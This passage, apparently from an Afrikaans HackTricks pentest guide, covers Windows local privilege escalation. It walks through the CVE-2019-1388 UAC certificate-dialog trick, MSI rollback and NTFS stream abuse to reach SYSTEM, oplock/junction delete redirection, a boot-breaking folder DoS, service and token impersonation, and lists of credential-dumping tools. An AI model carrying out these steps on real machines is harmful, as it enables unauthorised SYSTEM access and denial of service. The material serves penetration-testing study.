Sommige van die geaffekteerde stelsels is die volgende:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Om hierdie vulnerability te exploit, is dit nodig om die volgende stappe uit te voer:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Jy het al die nodige lêers en inligting in die volgende GitHub-repository:

https://github.com/jas502n/CVE-2019-1388

## Van Administrator Medium na High Integriteitsvlak / UAC Bypass

Lees dit om meer te **leer oor Integriteitsvlakke**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lees dan **hieroor om te leer oor UAC en UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Van Willekeurige Gids Verwyder/Skuif/Hernoem na SYSTEM EoP

Die tegniek beskryf [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) met 'n exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Die aanval bestaan basies uit die misbruik van die Windows Installer se rollback-funksie om legitieme lêers tydens die deïnstallasieproses met kwaai lêers te vervang. Hiervoor moet die aanvaller 'n **kwaai MSI-installer** skep wat gebruik sal word om die `C:\Config.Msi` gids te kap, wat later deur die Windows Installer gebruik sal word om rollback-lêers te stoor tydens die deïnstallasie van ander MSI-pakkette waar die rollback-lêers aangepas sou wees om die kwaai payload te bevat.

Die samevattende tegniek is soos volg:

1. **Fase 1 – Voorbereiding vir die Kaping (laat `C:\Config.Msi` leeg)**

- Stap 1: Installeer die MSI
- Skep 'n `.msi` wat 'n onskadelike lêer (bv. `dummy.txt`) in 'n skryfbare gids (`TARGETDIR`) installeer.
- Merk die installer as **"UAC Compliant"**, sodat 'n **nie-admin gebruiker** dit kan uitvoer.
- Hou 'n **handle** oop na die lêer ná installasie.

- Stap 2: Begin Deïnstallasie
- Deïnstalleer dieselfde `.msi`.
- Die deïnstallasieproses begin lêers na `C:\Config.Msi` skuif en hernoem na `.rbf` lêers (rollback-rugsteunkopieë).
- **Poll die oop file handle** met `GetFinalPathNameByHandle` om te ontdek wanneer die lêer `C:\Config.Msi\<random>.rbf` word.

- Stap 3: Aangepaste Sinchronisering
- Die `.msi` sluit 'n **aangepaste uninstall action (`SyncOnRbfWritten`)** in wat:
- Sein wanneer die `.rbf` geskryf is.
- Dan **wag** op 'n ander gebeurtenis voordat dit voortgaan met die deïnstallasie.

- Stap 4: Blokkeer Verwydering van `.rbf`
- Wanneer gesignaleer, **open die `.rbf` lêer** sonder `FILE_SHARE_DELETE` — dit **voorkom dat dit uitgevee word**.
- Dan **seine terug** sodat die deïnstallasie kan klaarmaak.
- Windows Installer kan die `.rbf` nie uitvee nie, en omdat dit nie al die inhoud kan verwyder nie, **word `C:\Config.Msi` nie verwyder nie**.

- Stap 5: Vee `.rbf` Handmatig Uit
- Jy (aanvaller) vee die `.rbf` lêer handmatig uit.
- Nou is **`C:\Config.Msi` leeg**, gereed om gekaap te word.

> Op hierdie punt, **trigger die SYSTEM-level arbitrary folder delete vulnerability** om `C:\Config.Msi` te verwyder.

2. **Fase 2 – Vervanging van Rollback-skripte met Kwaai Skripte**

- Stap 6: Hernoem `C:\Config.Msi` met Swak ACLs
- Hernoem die `C:\Config.Msi` gids self.
- Stel **swak DACLs** in (bv. Everyone:F), en **hou 'n handle oop** met `WRITE_DAC`.

- Stap 7: Voer Nog 'n Installasie uit
- Installeer die `.msi` weer, met:
- `TARGETDIR`: skryfbare ligging.
- `ERROROUT`: 'n veranderlike wat 'n geforseerde mislukking veroorsaak.
- Hierdie installasie sal gebruik word om weer **rollback** te trigger, wat `.rbs` en `.rbf` sal lees.

- Stap 8: Monitor vir `.rbs`
- Gebruik `ReadDirectoryChangesW` om `C:\Config.Msi` te monitor totdat 'n nuwe `.rbs` verskyn.
- Vang die lêernaam vas.

- Stap 9: Sinchroniseer Voor Rollback
- Die `.msi` bevat 'n **aangepaste install action (`SyncBeforeRollback`)** wat:
- 'n gebeurtenis sein wanneer die `.rbs` geskep is.
- Dan **wag** voordat dit voortgaan.

- Stap 10: Herstel Swak ACL
- Nadat jy die “`.rbs created`” sein ontvang het:
- Die Windows Installer **herstel sterk ACLs** op `C:\Config.Msi`.
- Maar omdat jy steeds 'n handle met `WRITE_DAC` het, kan jy weer **swak ACLs toepas**.

> ACLs word **slegs op handle-open afgedwing**, so jy kan steeds na die gids skryf.

- Stap 11: Plaas Vals `.rbs` en `.rbf`
- Oorskryf die `.rbs` lêer met 'n **valse rollback-skrip** wat Windows vertel om:
- Jou `.rbf` lêer (kwaai DLL) in 'n **bevoorregte ligging** te herstel (bv. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Jou valse `.rbf` neer te sit wat 'n **kwaai SYSTEM-vlak payload DLL** bevat.

- Stap 12: Trigger die Rollback
- Seine die sinchroniseergebeurtenis sodat die installer voortgaan.
- 'n **type 19 custom action (`ErrorOut`)** is gekonfigureer om die install doelbewus op 'n bekende punt te laat misluk.
- Dit veroorsaak dat **rollback begin**.

- Stap 13: SYSTEM Installeer Jou DLL
- Windows Installer:
- Lees jou kwaai `.rbs`.
- Kopieer jou `.rbf` DLL in die teikengebied.
- Jy het nou jou **kwaai DLL in 'n SYSTEM-gelaaide pad**.

- Finale Stap: Voer SYSTEM-kode uit
- Voer 'n vertroude **auto-elevated binary** uit (bv. `osk.exe`) wat die DLL laai wat jy gekaap het.
- **Boom**: Jou kode word uitgevoer **as SYSTEM**.


### Van Arbitrêre Lêer Verwyder/Skuif/Hernoem na SYSTEM EoP

Die hoof MSI-rollback tegniek (hierbo) veronderstel dat jy 'n **hele gids** kan uitvee (bv. `C:\Config.Msi`). Maar wat as jou kwesbaarheid slegs **arbitrary file deletion** toelaat?

Jy kan NTFS-internals misbruik: elke gids het 'n verborge alternatiewe data-stroom genaamd:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Hierdie stroom stoor die **indeksmetadata** van die gids.

Dus, as jy **die `::$INDEX_ALLOCATION` stroom verwyder** van 'n gids, verwyder NTFS **die hele gids** uit die lêerstelsel.

Jy kan dit doen met standaard lêerverwyderings-APIs soos:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Alhoewel jy 'n *file* delete API aanroep, verwyder dit **die folder self**.

### Van Folder Contents Delete na SYSTEM EoP
Wat as jou primitive jou nie toelaat om arbitrêre files/folders te verwyder nie, maar dit **laat wel die verwydering toe van die *contents* van 'n aanvaller-beheerde folder**?

1. Stap 1: Stel 'n lok-folder en file op
- Create: `C:\temp\folder1`
- Daarin: `C:\temp\folder1\file1.txt`

2. Stap 2: Plaas 'n **oplock** op `file1.txt`
- Die oplock **onderbreek die uitvoering** wanneer 'n bevoorregte proses probeer om `file1.txt` te verwyder.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Stap 3: Aktiveer SYSTEM-proses (bv., `SilentCleanup`)
- Hierdie proses deursoek gidse (bv., `%TEMP%`) en probeer hul inhoud verwyder.
- Wanneer dit by `file1.txt` kom, **oplock aktiveer** en gee beheer aan jou callback.

4. Stap 4: Binne die oplock callback – herlei die verwydering

- Opsie A: Verplaas `file1.txt` na 'n ander plek
- Dit maak `folder1` leeg sonder om die oplock te breek.
- Moet nie `file1.txt` direk verwyder nie — dit sou die oplock te vroeg vrylaat.

- Opsie B: Skakel `folder1` om in 'n **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opsie C: Skep 'n **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dit teiken die NTFS internal stream wat vouermetadata stoor — deur dit te verwyder word die vouer verwyder.

5. Stap 5: Laat die oplock vry
- SYSTEM-proses gaan voort en probeer `file1.txt` verwyder.
- Maar nou, as gevolg van die junction + symlink, word dit eintlik verwyder:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultaat**: `C:\Config.Msi` word deur SYSTEM verwyder.

### Van Arbitrary Folder Create na Permanente DoS

Benut 'n primitive wat jou toelaat om **create an arbitrary folder as SYSTEM/admin** — selfs al **kan jy nie lêers skryf** of **swak toestemmings stel nie**.

Skep 'n **gids** (nie 'n lêer nie) met die naam van 'n **kritieke Windows driver**, bv.:
```
C:\Windows\System32\cng.sys
```
- Hierdie pad kom normaalweg ooreen met die kernel-mode driver `cng.sys`.
- As jy dit **vooraf as 'n vouer skep**, kan Windows nie die werklike driver tydens opstart laai nie.
- Dan probeer Windows om `cng.sys` tydens opstart te laai.
- Dit sien die vouer, **slaag nie daarin om die werklike driver op te los nie**, en **stort of bring die opstart tot stilstand**.
- Daar is **geen terugvalopsie** nie, en **geen herstel** sonder eksterne ingryping nie (bv. opstartherstel of skyftetoegang).


## **Van Hoë Integriteit na SYSTEM**

### **Nuwe diens**

As jy reeds op 'n Hoë Integriteit-proses loop, kan die **pad na SYSTEM** maklik wees deur net **'n nuwe diens te skep en uit te voer**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wanneer jy 'n service binary skep, maak seker dit is 'n geldige diens of dat die binary die nodige aksies vinnig uitvoer, anders word dit binne 20s gedood as dit nie 'n geldige diens is nie.

### AlwaysInstallElevated

Vanaf 'n High Integrity-proses kan jy probeer om die AlwaysInstallElevated registry entries te aktiveer en 'n reverse shell te installeer met 'n _**.msi**_ wrapper.\
[Meer inligting oor die registry keys wat betrokke is en hoe om 'n _.msi_ pakket te installeer vind jy hier.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Jy kan** [**die kode hier vind**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

As jy daardie token privileges het (waarskynlik sal jy dit in 'n reeds High Integrity-proses vind), sal jy byna enige proses kan oopmaak (nie-protected processes) met die SeDebug privilege, die token van die proses kan kopieer, en 'n ewekansige proses met daardie token kan skep.\
Hierdie tegniek kies gewoonlik 'n proses wat as SYSTEM loop met al die token privileges (_ja, jy kan SYSTEM-prosesse vind sonder al die token privileges_).\
**Jy kan 'n** [**voorbeeld van kode wat die voorgestelde tegniek uitvoer hier vind**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Hierdie tegniek word deur meterpreter gebruik om te escaleren in `getsystem`. Die tegniek bestaan uit die skepping van 'n pipe en dan om 'n diens te skep/misbruik om op daardie pipe te skryf. Vervolgens sal die **server** wat die pipe geskep het met die **`SeImpersonate`** privilege die token van die pipe-klant (die diens) kan impersonate en SYSTEM-privileges verkry.\
As jy meer wil [**leer oor name pipes moet jy dit hier lees**](#named-pipe-client-impersonation).\
As jy 'n voorbeeld wil lees van [**hoe om van high integrity na System te gaan met name pipes lees dit hier**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

As jy daarin slaag om 'n dll wat deur 'n **proses** wat as **SYSTEM** loop gelaai word te **hijack**, sal jy ewekansige kode met daardie regte kan uitvoer. Daarom is Dll Hijacking ook nuttig vir hierdie soort privilege escalation, en dit is verder veel **makkelijker om van 'n High Integrity-proses te bereik** aangesien dit **write permissions** op die vouers het wat gebruik word om dlls te laai.\
**Jy kan** [**meer leer oor Dll hijacking hier**](dll-hijacking/index.html)**.**

### From Administrator or Network Service to System

- https://github.com/sailay1996/RpcSsImpersonator
- https://decoder.cloud/2020/05/04/from-network-service-to-system/
- https://github.com/decoder-it/NetworkServiceExploit

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lees:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Meer hulp

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Nuttige tools

**Beste gereedskap om Windows local privilege escalation vectors te soek:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kontroleer vir misconfigurasies en sensitiewe lêers (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Gedetekteer.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kontroleer vir sekere moontlike misconfigurasies en versamel inligting (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kontroleer vir misconfigurasies**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Trek PuTTY, WinSCP, SuperPuTTY, FileZilla en RDP gestoor sessie-inligting uit. Gebruik -Thorough plaaslik.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Trek credentials uit Credential Manager. Gedetekteer.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray versamelde wagwoorde oor die domein**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is 'n PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer en man-in-the-middle hulpmiddel.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese privesc Windows enumerasie**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Soek na bekende privesc kwesbaarhede (DEPRECATED vir Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale kontroles **(Vereis Admin regte)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek na bekende privesc kwesbaarhede (moet gekompileer word met VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumereer die gasheer en soek na misconfigurasies (meer 'n inligtingsversamelingsinstrument as privesc) (moet gekompileer word) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Trek credentials uit baie sagteware (precompiled exe op github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Poort van PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Kontroleer vir misconfigurasies (precompiled executable op github). Nie aanbeveel nie. Werk nie goed op Win10 nie.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kontroleer vir moontlike misconfigurasies (exe van python). Nie aanbeveel nie. Werk nie goed op Win10 nie.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Gereedskap geskep gebaseer op hierdie post (dit benodig nie accesschk om behoorlik te werk nie, maar kan dit gebruik).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (lokale python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die uitset van **systeminfo** en beveel werkende exploits aan (lokale python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Jy moet die projek compileer met die korrekte weergawe van .NET ([sien dit](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde weergawe van .NET op die slagoffer-host te sien, kan jy:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Verwysings

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

{{#include ../../banners/hacktricks-training.md}}
